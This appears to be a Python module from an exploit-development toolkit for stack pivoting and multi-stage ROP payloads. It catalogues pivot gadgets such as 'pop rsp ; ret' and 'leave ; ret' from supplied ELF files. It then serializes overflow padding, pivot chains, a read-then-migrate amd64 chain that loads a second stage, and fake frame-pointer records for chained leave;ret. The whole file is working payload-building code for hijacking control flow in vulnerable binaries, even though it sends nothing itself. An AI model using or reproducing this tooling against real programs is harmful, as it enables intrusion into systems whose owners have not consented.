"""Offline stack-pivot cataloguing and multi-stage migration serializers.

Unlike a generic ROP assembler, this module models the boundary between a
small first-stage stack, a migration primitive, and one or more separately
placed later stages.  Supplied ELF files are only parsed by the static r5b
gadget catalog; no binary is executed.
"""
from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import Iterable, Mapping, Sequence

try:
    from .contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes
    from .gadget_catalog import Gadget, GadgetCatalog, catalog_elf
except ImportError:  # pragma: no cover
    from contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes
    from gadget_catalog import Gadget, GadgetCatalog, catalog_elf


MAX_STAGE = 8 * 1024 * 1024
MAX_HOPS = 128


@dataclass(frozen=True, order=True)
class PivotGadget:
    address: int
    architecture: str
    strategy: str
    semantic: str
    setup_register: str
    contract: str


@dataclass(frozen=True)
class PivotCatalog:
    architecture: str
    bits: int
    pivots: tuple[PivotGadget, ...]
    source_entry: int

    def find(self, strategy: str) -> tuple[PivotGadget, ...]:
        return tuple(item for item in self.pivots if item.strategy == strategy)

    def choose(self, preferences: Sequence[str] = ("pop-sp", "exchange-sp", "leave-ret")) -> PivotGadget:
        for strategy in preferences:
            matches = self.find(strategy)
            if matches:
                return matches[0]
        raise BuildError("no preferred stack-pivot gadget is present")


@dataclass(frozen=True)
class LeaveHop:
    frame_address: int
    next_frame_pointer: int
    continuation: int


_PIVOT_SEMANTICS: Mapping[str, tuple[str, str, str]] = {
    "pop rsp ; ret": ("pop-sp", "rsp", "pop rsp from the current stack, then ret on the new stack"),
    "xchg rax, rsp ; ret": ("exchange-sp", "rax", "load rax, exchange it with rsp, then ret"),
    "mov rsp, rax ; ret": ("exchange-sp", "rax", "load rax, copy it to rsp, then ret"),
    "leave ; ret": ("leave-ret", "rbp", "load rbp with the new frame; leave sets rsp and pops rbp"),
    "pop esp ; ret": ("pop-sp", "esp", "pop esp from the current stack, then ret on the new stack"),
    "xchg eax, esp ; ret": ("exchange-sp", "eax", "load eax, exchange it with esp, then ret"),
}

_ARCH_PIVOT_SEMANTICS: Mapping[str, frozenset[str]] = {
    "amd64": frozenset((
        "pop rsp ; ret", "xchg rax, rsp ; ret", "mov rsp, rax ; ret", "leave ; ret",
    )),
    "i386": frozenset(("pop esp ; ret", "xchg eax, esp ; ret", "leave ; ret")),
}


def catalog_pivots(
    source: GadgetCatalog | bytes | bytearray | memoryview | str | Path,
    *,
    load_bias: int = 0,
) -> PivotCatalog:
    """Extract recognized pivot contracts from a supplied ELF or catalog."""

    catalog = source if isinstance(source, GadgetCatalog) else catalog_elf(source, load_bias=load_bias)
    if not isinstance(catalog.architecture, str) or catalog.architecture not in ("amd64", "i386"):
        raise BuildError("pivot catalog currently supports amd64 and i386")
    expected_bits = 64 if catalog.architecture == "amd64" else 32
    if catalog.bits != expected_bits:
        raise BuildError("pivot catalog architecture and bit width disagree")
    ensure_uint(catalog.entry, expected_bits, name="catalog entry")
    rows: list[PivotGadget] = []
    for gadget in catalog.gadgets:
        if not isinstance(gadget, Gadget):
            raise BuildError("gadget catalog contains a malformed gadget record")
        if gadget.semantic not in _PIVOT_SEMANTICS:
            continue
        ensure_uint(gadget.address, expected_bits, name="pivot gadget address")
        strategy, register, contract = _PIVOT_SEMANTICS[gadget.semantic]
        rows.append(PivotGadget(
            gadget.address, catalog.architecture, strategy, gadget.semantic, register, contract
        ))
    rows.sort(key=lambda item: (item.address, item.strategy, item.semantic))
    return PivotCatalog(catalog.architecture, catalog.bits, tuple(rows), catalog.entry)


def _word(bits: int, value: int, name: str) -> bytes:
    ensure_uint(value, bits, name=name)
    return value.to_bytes(bits // 8, "little")


def _prefix(offset: int, fill: bytes) -> bytes:
    if isinstance(offset, bool) or not isinstance(offset, int) or not 0 <= offset <= MAX_STAGE:
        raise BuildError(f"overflow_offset must be in 0..{MAX_STAGE}")
    if not isinstance(fill, bytes) or len(fill) != 1:
        raise BuildError("fill must be one byte")
    return fill * offset


def _ensure_address_range(start: int, size: int, bits: int, *, name: str) -> None:
    """Reject a serialized region that would wrap the target address space."""

    ensure_uint(start, bits, name=f"{name} start")
    if isinstance(size, bool) or not isinstance(size, int) or size < 0:
        raise BuildError(f"{name} size must be a non-negative integer")
    if size > (1 << bits) - start:
        raise BuildError(f"{name} exceeds the {bits}-bit address space")


def build_pivot_stage(
    pivot: PivotGadget,
    *,
    new_stack_address: int,
    overflow_offset: int = 0,
    setup_gadget: int | None = None,
    base_address: int = 0,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Serialize the minimal first stage for one catalogued pivot contract."""

    if not isinstance(pivot, PivotGadget):
        raise BuildError("pivot must be a PivotGadget")
    if not isinstance(pivot.architecture, str) or pivot.architecture not in ("amd64", "i386"):
        raise BuildError("pivot architecture must be amd64 or i386")
    expected = _PIVOT_SEMANTICS.get(pivot.semantic)
    if (
        expected is None
        or pivot.semantic not in _ARCH_PIVOT_SEMANTICS[pivot.architecture]
        or (pivot.strategy, pivot.setup_register) != expected[:2]
    ):
        raise BuildError("pivot strategy/setup does not match its architecture and semantic")
    bits = 64 if pivot.architecture == "amd64" else 32
    ensure_uint(base_address, bits, name="base_address")
    data = bytearray(_prefix(overflow_offset, fill))
    placements: dict[str, int] = {}
    widths: dict[str, int] = {}
    if overflow_offset:
        placements["padding"] = 0
        widths["padding"] = overflow_offset

    def add(label: str, value: int) -> None:
        placements[label] = len(data)
        widths[label] = bits // 8
        data.extend(_word(bits, value, label))

    if pivot.strategy == "pop-sp":
        add("pivot_gadget", pivot.address)
        add("new_stack_address", new_stack_address)
    elif pivot.strategy in {"exchange-sp", "leave-ret"}:
        if setup_gadget is None:
            raise BuildError(f"{pivot.strategy} requires a caller-supplied setup_gadget")
        add(f"setup_{pivot.setup_register}", setup_gadget)
        add("new_stack_address", new_stack_address)
        add("pivot_gadget", pivot.address)
    else:
        raise BuildError(f"unsupported pivot strategy: {pivot.strategy}")
    raw = bytes(data)
    _ensure_address_range(base_address, len(raw), bits, name="pivot payload")
    reject_bad_bytes(raw, bad_bytes)
    return PayloadBuild(
        raw, placements, widths,
        architecture=pivot.architecture,
        strategy=f"stack-migration-{pivot.strategy}",
        base_address=base_address,
        metadata={"gadget_contract": pivot.contract, "pivot_semantic": pivot.semantic},
    )


def build_catalog_pivot_stage(
    source: GadgetCatalog | bytes | bytearray | memoryview | str | Path,
    *,
    new_stack_address: int,
    preferences: Sequence[str] = ("pop-sp", "exchange-sp", "leave-ret"),
    overflow_offset: int = 0,
    setup_gadget: int | None = None,
    base_address: int = 0,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Choose a deterministic pivot from a supplied static catalog and serialize it."""

    catalog = catalog_pivots(source)
    result = build_pivot_stage(
        catalog.choose(preferences),
        new_stack_address=new_stack_address,
        overflow_offset=overflow_offset,
        setup_gadget=setup_gadget,
        base_address=base_address,
        fill=fill,
        bad_bytes=bad_bytes,
    )
    return PayloadBuild(
        result.payload, result.placements, result.widths,
        architecture=result.architecture,
        strategy="catalog-selected-stack-migration",
        base_address=result.base_address,
        metadata={**dict(result.metadata), "catalog_entry": hex(catalog.source_entry)},
    )


def build_read_then_migrate_amd64(
    catalog: GadgetCatalog,
    *,
    read_address: int,
    destination: int,
    stage2: bytes,
    overflow_offset: int,
    fd: int = 0,
    stage1_base: int = 0,
    fill: bytes = b"A",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Build an AMD64 ``read(fd, destination, len(stage2)); pop rsp`` bundle.

    ``payload[:stage2_wire_offset]`` is the first send and the remaining bytes
    are the second-stage send.  This explicit split avoids implying delivery.
    """

    if not isinstance(catalog, GadgetCatalog) or catalog.architecture != "amd64":
        raise BuildError("read migration requires an amd64 GadgetCatalog")
    if not isinstance(stage2, bytes) or not 1 <= len(stage2) <= MAX_STAGE:
        raise BuildError(f"stage2 must contain 1..{MAX_STAGE} bytes")
    ensure_uint(destination, 64, name="destination")
    ensure_uint(read_address, 64, name="read_address")
    ensure_uint(fd, 64, name="fd")
    ensure_uint(stage1_base, 64, name="stage1_base")
    _ensure_address_range(destination, len(stage2), 64, name="stage2 destination")
    by_semantic = catalog.by_semantic()

    def first(name: str) -> int:
        values = by_semantic.get(name, ())
        if not values:
            raise BuildError(f"catalog lacks {name}")
        return values[0]

    data = bytearray(_prefix(overflow_offset, fill))
    placements: dict[str, int] = {"padding": 0} if overflow_offset else {}
    widths: dict[str, int] = {"padding": overflow_offset} if overflow_offset else {}

    def add(label: str, value: int) -> None:
        placements[label] = len(data)
        widths[label] = 8
        data.extend(_word(64, value, label))

    for register, value in (("rdi", fd), ("rsi", destination), ("rdx", len(stage2))):
        add(f"pop_{register}", first(f"pop {register} ; ret"))
        add(f"read_{register}", value)
    add("read_address", read_address)
    add("pop_rsp", first("pop rsp ; ret"))
    add("destination", destination)
    stage1_length = len(data)
    _ensure_address_range(stage1_base, stage1_length, 64, name="stage1 payload")
    placements["stage1"] = 0
    widths["stage1"] = stage1_length
    placements["stage2"] = stage1_length
    widths["stage2"] = len(stage2)
    data += stage2
    raw = bytes(data)
    reject_bad_bytes(raw, bad_bytes)
    return PayloadBuild(
        raw, placements, widths,
        architecture="amd64",
        strategy="read-then-stack-migrate",
        base_address=stage1_base,
        metadata={
            "stage1_length": str(stage1_length),
            "stage2_address": hex(destination),
            "wire_contract": "send stage1 then send stage2; no delivery performed",
        },
    )


def build_leave_hop_bundle(
    hops: Sequence[LeaveHop],
    *,
    architecture: str = "amd64",
    bad_bytes: Iterable[int] = (),
) -> PayloadBuild:
    """Serialize separately placed fake frame-pointer records for chained ``leave; ret``."""

    if not isinstance(architecture, str) or architecture not in ("amd64", "i386"):
        raise BuildError("leave-hop bundles support amd64 and i386")
    if not hops or len(hops) > MAX_HOPS or any(not isinstance(hop, LeaveHop) for hop in hops):
        raise BuildError(f"hops must contain 1..{MAX_HOPS} LeaveHop records")
    bits = 64 if architecture == "amd64" else 32
    word = bits // 8
    frame_addresses: list[int] = []
    frame_ranges: list[tuple[int, int, int]] = []
    for index, hop in enumerate(hops):
        ensure_uint(hop.frame_address, bits, name=f"hop[{index}].frame_address")
        ensure_uint(hop.next_frame_pointer, bits, name=f"hop[{index}].next_frame_pointer")
        ensure_uint(hop.continuation, bits, name=f"hop[{index}].continuation")
        _ensure_address_range(
            hop.frame_address, 2 * word, bits, name=f"hop[{index}] frame"
        )
        frame_addresses.append(hop.frame_address)
        frame_ranges.append((hop.frame_address, hop.frame_address + 2 * word, index))
    if len(set(frame_addresses)) != len(frame_addresses):
        raise BuildError("leave-hop frame addresses must be unique")
    if any(address % word for address in frame_addresses):
        raise BuildError("leave-hop frame addresses must be word aligned")
    ordered_ranges = sorted(frame_ranges)
    for (_, left_end, left_index), (right_start, _, right_index) in zip(
        ordered_ranges, ordered_ranges[1:]
    ):
        if right_start < left_end:
            raise BuildError(
                f"leave-hop frame ranges overlap: hop[{left_index}] and hop[{right_index}]"
            )
    for index, hop in enumerate(hops[:-1]):
        if hop.next_frame_pointer != hops[index + 1].frame_address:
            raise BuildError(
                f"hop[{index}] next_frame_pointer does not link to hop[{index + 1}]"
            )
    data = bytearray()
    placements: dict[str, int] = {}
    widths: dict[str, int] = {}
    addresses: list[str] = []
    for index, hop in enumerate(hops):
        placements[f"hop[{index}]"] = len(data)
        widths[f"hop[{index}]"] = 2 * word
        placements[f"hop[{index}].next_frame_pointer"] = len(data)
        widths[f"hop[{index}].next_frame_pointer"] = word
        data += _word(bits, hop.next_frame_pointer, f"hop[{index}].next_frame_pointer")
        placements[f"hop[{index}].continuation"] = len(data)
        widths[f"hop[{index}].continuation"] = word
        data += _word(bits, hop.continuation, f"hop[{index}].continuation")
        addresses.append(hex(hop.frame_address))
    raw = bytes(data)
    reject_bad_bytes(raw, bad_bytes)
    return PayloadBuild(
        raw, placements, widths,
        architecture=architecture,
        strategy="multi-hop-leave-ret-frames",
        metadata={
            "frame_addresses": ",".join(addresses),
            "wire_contract": "split fixed-width records and place at listed frame addresses",
        },
    )

